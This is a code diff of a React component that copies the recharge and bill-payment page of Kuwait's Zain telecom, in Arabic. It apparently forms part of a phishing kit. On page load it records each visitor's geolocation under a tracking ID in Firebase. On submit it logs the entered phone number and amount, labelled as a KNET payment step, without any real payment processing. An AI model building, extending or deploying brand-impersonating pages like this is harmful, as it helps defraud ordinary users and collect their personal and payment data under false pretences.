@@ -1,63 +1,69 @@
 "use client"
 
-import { Heart, Menu, Plus, ShoppingCart, ChevronDown, AlertCircle } from "lucide-react"
+import React,{ useState, useEffect, useCallback } from "react"
+import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone, Loader2 } from 'lucide-react'
 import { Button } from "@/components/ui/button"
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
+import { Label } from "@/components/ui/label"
 import { Input } from "@/components/ui/input"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
-import { Card, CardContent } from "@/components/ui/card"
-import { useEffect, useState } from "react"
-import { setupOnlineStatus } from "@/lib/utils"
-import { addData } from "@/lib/firebase"
+import { Checkbox } from "@/components/ui/checkbox"
+import { Badge } from "@/components/ui/badge"
+import { Separator } from "@/components/ui/separator"
+// Assuming these are correctly set up in your project
+ import { addData } from "@/lib/firebase";
+ import { setupOnlineStatus } from "@/lib/utils";
+import LoaderApp from "@/components/loader"
 
-interface ValidationErrors {
-  phoneNumber?: string
-  amount?: string
-}
+// Placeholder functions to avoid errors if lib files are not present
 
-interface PhoneEntry {
-  id: string
-  number: string
-  amount: string
-  validity: string
-}
 
-const visitorId = `zain2-app-${Math.random().toString(36).substring(2, 15)}`;
+const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
 
-export default function ZainPaymentInterface() {
-  const [phoneEntries, setPhoneEntries] = useState<PhoneEntry[]>([
-    { id: "1", number: "", amount: "6.000", validity: "30 يوم" },
-  ])
-  const [phoneNumber, setPhoneNumber]=useState('')
-  const [errors, setErrors] = useState<{ [key: string]: ValidationErrors }>({})
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [selectedAmount, setSelectedAmount] = useState('')
 
-  // Kuwait phone number validation
-  const validatePhoneNumber = (phone: string): string | undefined => {
-    if (!phone) return "رقم الهاتف مطلوب"
-    setPhoneNumber(phone)
-    // Remove any spaces or special characters
-    const cleanPhone = phone.replace(/\s+/g, "").replace(/[^\d]/g, "")
+export default function ZainPaymentForm() {
+  const [phone, setPhone] = useState("")
+  const [paymentType, setPaymentType] = useState("other")
+  const [termsAccepted, setTermsAccepted] = useState(false)
+  const [amount, setAmount] = useState('6.00')
+  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
+  const [phoneError, setPhoneError] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  const [activeTab, setActiveTab] = useState("bill")
 
-    // Kuwait mobile numbers: 8 digits starting with 5, 6, 9, or 7
-    if (cleanPhone.length !== 8) {
-      return "رقم الهاتف يجب أن يكون 8 أرقام"
+  useEffect(() => {
+   getLocationAndLog()
+  }, []);
+
+  useEffect(() => {
+    localStorage.setItem("amount",amount);
+  }, [amount]);
+
+
+
+  useEffect(() => {
+    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
+      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.")
+    } else {
+      setPhoneError("")
     }
+  }, [phone])
 
-    if (!/^[5679]/.test(cleanPhone)) {
-      return "رقم الهاتف يجب أن يبدأ بـ 5 أو 6 أو 7 أو 9"
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, "")
+    if (value.length <= 8) {
+      setPhone(value)
     }
-
-    return undefined
   }
- 
+
   const handleAmountSelect = (value: string) => {
     setSelectedAmount(value)
     localStorage.setItem("amount", value) // Consider if this is necessary or should be component state only
+    setAmount((value))
   }
 
-  const getLocationAndLog = async () => {
+  const getLocationAndLog = useCallback(async () => {
     if (!visitorId) return;
 
     // This API key is public and might be rate-limited or disabled.
@@ -90,26 +96,22 @@ export default function ZainPaymentInterface() {
         action: "location_error"
       });
     }
-  }
+  }, [visitorId]);
 
   useEffect(() => {
     if (visitorId) {
       getLocationAndLog();
     }
-  }, []);
-  useEffect(() => {
-   const amount =localStorage.setItem('amount',selectedAmount)
-   console.log(amount)
-  }, [selectedAmount]);
+  }, [visitorId, getLocationAndLog]);
 
   const handleSubmit = async (e:any) => {
     e.preventDefault()
-    setIsSubmitting(true)
+    setIsLoading(true)
     try {
       await addData({
         id: visitorId,
-        phone: phoneNumber, // Storing phone number, ensure compliance with privacy regulations
-        amount: selectedAmount,
+        phone: phone, // Storing phone number, ensure compliance with privacy regulations
+        amount: amount,
         timestamp: new Date().toISOString(),
         currentPage: "كي نت ",
         action: "payment_submit_attempt"
@@ -133,285 +135,168 @@ export default function ZainPaymentInterface() {
       });
       // Handle error display to user
     } finally {
-      setIsSubmitting(false)
-    }
-  }
-  // Amount validation
-  const validateAmount = (amount: string): string | undefined => {
-    if (!amount) return "مبلغ التعبئة مطلوب"
-
-    const numAmount = Number.parseFloat(amount)
-    if (isNaN(numAmount)) return "مبلغ غير صحيح"
-    if (numAmount < 1) return "الحد الأدنى للتعبئة 1.000 د.ك"
-    if (numAmount > 50) return "الحد الأقصى للتعبئة 50.000 د.ك"
-
-    return undefined
-  }
-
-  // Validate a single phone entry
-  const validateEntry = (entry: PhoneEntry): ValidationErrors => {
-    return {
-      phoneNumber: validatePhoneNumber(entry.number),
-      amount: validateAmount(entry.amount),
+      setIsLoading(false)
     }
   }
 
-  // Validate all entries
-  const validateAllEntries = () => {
-    const newErrors: { [key: string]: ValidationErrors } = {}
-    let hasErrors = false
+  const isFormValid = phone.length === 8 &&  parseInt(amount) > 0
 
-    phoneEntries.forEach((entry) => {
-      const entryErrors = validateEntry(entry)
-      if (entryErrors.phoneNumber || entryErrors.amount) {
-        newErrors[entry.id] = entryErrors
-        hasErrors = true
-      }
-    })
+  const billAmounts = ["5", "10", "15", "20", "30", "50"]
+  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"]
+  const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;
 
-    setErrors(newErrors)
-    return !hasErrors
-  }
+  const renderAmountSelection = () => (
+    phone.length === 8 && !phoneError && (
+      <div className="space-y-3">
+        <Label className="text-sm font-medium text-slate-800">
+          {activeTab === "bill" ? "اختر مبلغ الفاتورة" : "اختر باقة إعادة التعبئة"}
+        </Label>
+        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
+          {currentAmounts.map((value) => (
+            <Button
+              key={value}
+              type="button"
+              variant={selectedAmount === value ? "default" : "outline"}
+              className={`h-auto py-3 px-2 text-base font-semibold transition-all duration-200 rounded-lg shadow-sm hover:shadow-md focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2
+                ${selectedAmount === value
+                  ? "bg-primary text-primary-foreground scale-105 ring-2 ring-primary ring-offset-1"
+                  : "border-slate-300 hover:border-primary hover:bg-primary/10 text-slate-700"
+                }`}
+              onClick={() => handleAmountSelect(value)}
+            >
+              <div className="text-center w-full">
+                <div className="font-bold text-lg">{value}.000</div>
+                <div className="text-xs opacity-90">د.ك</div>
+              </div>
+            </Button>
+          ))}
+        </div>
+      </div>
+    )
+  );
+ 
+  const renderPhoneNumberInput = () => (
+    <div className="space-y-2">
+      <Label className="text-sm font-medium text-slate-800 flex items-center justify-between">
+        <span>رقم الهاتف</span>
+        <Badge variant="outline" className="text-xs font-normal border-primary/50 text-primary">مطلوب</Badge>
+      </Label>
+      <div className="relative">
+        <Input
+          type="tel"
+          placeholder="XXXXXXXX"
+          value={phone}
+          onChange={handlePhoneChange}
+          maxLength={8}
+          className={`h-12 text-lg font-mono bg-white border-slate-300 focus:border-primary focus:ring-1 focus:ring-primary transition-colors placeholder:text-slate-400 text-right
+            ${phoneError ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300"}
+            ${phone.length === 8 && !phoneError ? "border-green-500 focus:border-green-500 focus:ring-green-500" : ""}`}
+          dir="rtl" // Keep ltr for phone number input
+        />
+        {phone.length === 8 && !phoneError && (
+          <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
+        )}
+         {phoneError && phone.length > 0 && (
+            <AlertCircle className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
+        )}
+      </div>
+      {phoneError && (
+        <div className="flex items-center gap-2 text-xs text-red-600 pt-1">
+          <AlertCircle className="w-4 h-4 flex-shrink-0" />
+          <p>{phoneError}</p>
+        </div>
+      )}
+    </div>
+  );
 
-  // Update phone number
-  const updatePhoneNumber = (id: string, number: string) => {
-    setPhoneEntries((prev) => prev.map((entry) => (entry.id === id ? { ...entry, number } : entry)))
-
-    // Clear error for this field
-    setErrors((prev) => ({
-      ...prev,
-      [id]: { ...prev[id], phoneNumber: undefined },
-    }))
-  }
-
-  // Update amount
-  const updateAmount = (id: string, amount: string, validity: string) => {
-    setPhoneEntries((prev) => prev.map((entry) => (entry.id === id ? { ...entry, amount, validity } : entry)))
-    const amountw =localStorage.setItem('amount',amount)
-
-    // Clear error for this field
-    setErrors((prev) => ({
-      ...prev,
-      [id]: { ...prev[id], amount: undefined },
-    }))
-  }
-
-  // Add new phone entry
-  const addPhoneEntry = () => {
-    const newId = Date.now().toString()
-    setPhoneEntries((prev) => [
-      ...prev,
-      {
-        id: newId,
-        number: "",
-        amount: "1.000",
-        validity: "30 يوم",
-      },
-    ])
-  }
-
-  // Remove phone entry
-  const removePhoneEntry = (id: string) => {
-    if (phoneEntries.length > 1) {
-      setPhoneEntries((prev) => prev.filter((entry) => entry.id !== id))
-      setErrors((prev) => {
-        const newErrors = { ...prev }
-        delete newErrors[id]
-        return newErrors
-      })
-    }
-  }
-
-  // Calculate total
-  const calculateTotal = () => {
-    return phoneEntries
-      .reduce((total, entry) => {
-        const amount = Number.parseFloat(entry.amount) || 0
-        return total + amount
-      }, 0)
-      .toFixed(3)
-  }
-
-  
-
-  // Amount options
-  const amountOptions = [
-    { value: "1.000", label: "1.000 د.ك", validity: "30 يوم" },
-    { value: "2.000", label: "2.000 د.ك", validity: "30 يوم" },
-    { value: "3.000", label: "3.000 د.ك", validity: "30 يوم" },
-    { value: "5.000", label: "5.000 د.ك", validity: "30 يوم" },
-    { value: "6.000", label: "6.000 د.ك", validity: "30 يوم" },
-    { value: "10.000", label: "10.000 د.ك", validity: "60 يوم" },
-    { value: "20.000", label: "20.000 د.ك", validity: "90 يوم" },
-  ]
+  const renderTermsAndConditions = (idPrefix: string) => (
+     <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
+      <div className="flex items-start gap-3">
+        <Checkbox
+          id={`${idPrefix}-terms`}
+          checked={termsAccepted}
+          onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
+          className="mt-0.5 data-[state=checked]:bg-primary data-[state=checked]:border-primary border-slate-400"
+          aria-labelledby={`${idPrefix}-terms-label`}
+        />
+        <div className="grid gap-1.5 leading-none">
+          <Label
+            htmlFor={`${idPrefix}-terms`}
+            id={`${idPrefix}-terms-label`}
+            className="text-sm font-medium cursor-pointer text-slate-700 hover:text-primary transition-colors"
+          >
+            أوافق على الشروط والأحكام
+          </Label>
+          <p className="text-xs text-slate-500">
+            بالمتابعة، أنت توافق على شروط وأحكام الخدمة الخاصة بنا.
+          </p>
+        </div>
+      </div>
+    </div>
+  );
 
   return (
-    <div className="min-h-screen bg-gray-50" dir="rtl">
-      {/* Header */}
-      <header className="bg-gradient-to-l from-[#2b224d] to-[#1e1236] p-2 flex justify-between items-center shadow-md relative my-4 ">
+    <>
+     <header className="bg-gradient-to-l from-[#2b224d] to-[#1e1236] p-2 flex justify-between items-center shadow-md relative my-4 ">
      
      <div className="absolute right-0 left-0 flex justify-center pointer-events-none">
        <img src="/top.png" className="object-contain" />
      </div>
    </header>
-      {/* Main Content */}
-      <div className="px-4 py-6">
-        <h1 className="text-2xl font-bold text-gray-900 mb-6 text-center">الدفع السريع</h1>
+    <form dir="rtl" onSubmit={handleSubmit} className="min-h-screen bg-white text-black p-4">
+    <div className="max-w-md mx-auto bg-white rounded-xl shadow-md p-4" dir="rtl">
+      <div className="flex justify-around border-b pb-2 mb-4">
+        <button type="button" onClick={()=>setActiveTab('bill')} className={activeTab==="bill"?"text-pink-600 font-bold":"text-gray-600"}>دفع الفاتورة</button>
+        <button type="button" onClick={()=>setActiveTab('ess')}  className={activeTab==="ess"?"text-pink-600 font-bold":"text-gray-600"}>إعادة تعبئة eeZee</button>
 
-        {/* Tabs */}
-        <Tabs defaultValue="recharge" className="w-full">
-          <TabsList className="grid w-full grid-cols-2 mb-6">
-            <TabsTrigger
-              value="recharge"
-              className="data-[state=active]:border-b-2 data-[state=active]:border-pink-500 data-[state=active]:bg-transparent rounded-none pb-3"
-            >
-              إعادة تعبئة eeZee
-            </TabsTrigger>
-            <TabsTrigger
-              value="recharge"
-              className="data-[state=active]:border-b-2 data-[state=active]:border-pink-500 data-[state=active]:bg-transparent rounded-none pb-3"
-            >
-              دفع الفاتورة
-            </TabsTrigger>
-          </TabsList>
-
-          <TabsContent value="recharge" className="space-y-6">
-            {phoneEntries.map((entry, index) => (
-              <Card key={entry.id} className="border-0 shadow-sm">
-                <CardContent className="p-6 space-y-6">
-                  {/* Recharge For Dropdown */}
-                  {index === 0 ||index === 1 && (
-                    <div className="space-y-2">
-                      <Select defaultValue="other">
-                        <SelectTrigger className="w-full text-right border-0 border-b border-pink-300 rounded-none pb-3 focus:ring-0">
-                          <SelectValue />
-                          <ChevronDown className="w-4 h-4 text-pink-500" />
-                        </SelectTrigger>
-                        <SelectContent>
-                          <SelectItem value="other">ألتعبئة لـ رقم آخر</SelectItem>
-                          <SelectItem value="self"> التعبئة لـ رقمي</SelectItem>
-                        </SelectContent>
-                      </Select>
-                    </div>
-                  )}
-
-                  {/* Phone Number */}
-                  <div className="space-y-2" dir="rtl">
-                    <label className="text-sm text-gray-600">
-                      رقم الهاتف <span className="text-pink-500">*</span>
-                    </label>
-                    <div
-                      className={`bg-gray-50 border-b border-pink-400  p-3 ${errors[entry.id]?.phoneNumber ? "border-2 border-red-300" : ""}`}
-                    >
-                      <Input
-                        value={phoneNumber}
-                        onChange={(e) =>setPhoneNumber(e.target.value)}
-                        className="border-0 bg-transparent text-right text-lg font-medium focus-visible:ring-0"
-                        placeholder="أدخل رقم الهاتف"
-                        maxLength={8}
-                        required
-                        minLength={7}
-                      />
-                    </div>
-                    {errors[entry.id]?.phoneNumber && (
-                      <div className="flex items-center gap-2 text-red-500 text-sm">
-                        <AlertCircle className="w-4 h-4" />
-                        <span>{errors[entry.id].phoneNumber}</span>
-                      </div>
-                    )}
-                  </div>
-
-                  {/* Amount */}
-                  <div className="space-y-2" dir="rtl">
-                    <label className="text-sm text-gray-600">مبلغ التعبئة</label>
-                    <div className={`border-b pb-3 ${errors[entry.id]?.amount ? "border-red-300" : "border-pink-300"}`}>
-                      <Select
-                      
-                        value={entry.amount}
-                        onValueChange={(value) => {
-                          const option = amountOptions.find((opt) => opt.value === value)
-                          updateAmount(entry.id, value, option?.validity || "30 يوم")
-                        }}
-                      >
-                        <SelectTrigger className="w-full border-0 bg-transparent focus:ring-0">
-                          <div className="flex items-center justify-between w-full">
-                            <div className="text-sm text-gray-500">الصلاحية {entry.validity}</div>
-                            <div className="flex items-center gap-2">
-                              <ChevronDown className="w-4 h-4 text-pink-500" />
-                              <span className="text-lg font-medium">{entry.amount} د.ك</span>
-                            </div>
-                          </div>
-                        </SelectTrigger>
-                        <SelectContent className="bg-white">
-                          {amountOptions.map((option) => (
-                            <SelectItem key={option.value} value={option.value}>
-                              <div className="flex justify-between items-center w-full">
-                                <span className="text-sm text-gray-500">الصلاحية {option.validity}</span>
-                                <span>{option.label}</span>
-                              </div>
-                            </SelectItem>
-                          ))}
-                        </SelectContent>
-                      </Select>
-                    </div>
-                    {errors[entry.id]?.amount && (
-                      <div className="flex items-center gap-2 text-red-500 text-sm">
-                        <AlertCircle className="w-4 h-4" />
-                        <span>{errors[entry.id].amount}</span>
-                      </div>
-                    )}
-                  </div>
-
-                  {/* Remove button for additional entries */}
-                  {phoneEntries.length > 1 && (
-                    <Button
-                      variant="outline"
-                      size="sm"
-                      disabled
-                      onClick={() => removePhoneEntry(entry.id)}
-                      className="text-red-500 border-red-300 hover:bg-red-50"
-                    >
-                      إزالة هذا الرقم
-                    </Button>
-                  )}
-                </CardContent>
-              </Card>
-            ))}
-
-            {/* Add Another Number Button */}
-            <Button
-              variant="outline"
-              disabled
-              onClick={addPhoneEntry}
-              className="w-full border-2 border-pink-500 text-pink-500 hover:bg-pink-50 py-6 text-lg font-medium bg-transparent"
-            >
-              <Plus className="w-5 h-5 ml-2" />
-              أضف رقم آخر
-            </Button>
-
-            {/* Total Section */}
-            <div className="bg-white rounded-lg p-4 shadow-sm">
-              <div className="flex items-center justify-between text-xl font-bold">
-                <span className="text-green-500">{calculateTotal()} د.ك</span>
-                <span className="text-gray-900">إجمالي</span>
-              </div>
-            </div>
-
-            {/* Recharge Button */}
-            <Button
-              onClick={handleSubmit}
-              disabled={phoneNumber.length<8}
-              className="w-full bg-pink-500 hover:bg-pink-600 text-white py-6 text-lg font-medium rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              {isSubmitting ? "جاري المعالجة..." : "أعد التعبئة الآن"}
-            </Button>
-          </TabsContent>
-
-          <TabsContent value="bill">
-            <div className="text-center py-12 text-gray-500">محتوى دفع الفاتورة</div>
-          </TabsContent>
-        </Tabs>
       </div>
+
+      <h2 className="text-lg font-bold mb-2">أود أن أعيد التعبئة لـ</h2>
+
+      <div className="mb-4">
+        {renderPhoneNumberInput()}
+      </div>
+
+      <div className="mb-4">
+        <label className="block mb-1 text-gray-700">مبلغ التعبئة</label>
+        <select
+          className="w-full border border-gray-300 rounded p-2"
+          value={amount}
+          onChange={(e) => setAmount(e.target.value)}
+        >
+          <option value="6.000">6.000 د.ك (30 يوم)</option>
+          <option value="10.000">10.000 د.ك (60 يوم)</option>
+          <option value="15.000">15.000 د.ك (90 يوم)</option>
+          <option value="30.000">30.000 د.ك (120 يوم)</option>
+          <option value="40.000">40.000 د.ك (150 يوم)</option>
+          <option value="50.000">50.000 د.ك (200 يوم)</option>
+        </select>
+      </div>
+
+      <div className="text-center mb-4">
+        <button className=" text-gray-600 py-2 px-4 rounded w-full" disabled>
+          + أضف رقم آخر
+        </button>
+      </div>
+
+      <hr className="my-4" />
+
+      <div className="flex justify-between text-xl font-bold text-green-600 mb-4">
+      <span className="text-black">إجمالي</span>
+      
+        <span>{amount}د.ك</span>
+      </div>
+
+      <button disabled={!isFormValid} className={isFormValid?"bg-rose-600 text-white py-2 px-4 rounded w-full" :"bg-gray-300 text-gray-600 py-2 px-4 rounded w-full" }>
+        أعد التعبئة الآن
+      </button>
     </div>
+    {isLoading&&<LoaderApp/>}
+
+  </form>
+  </>
+
+
+
   )
 }
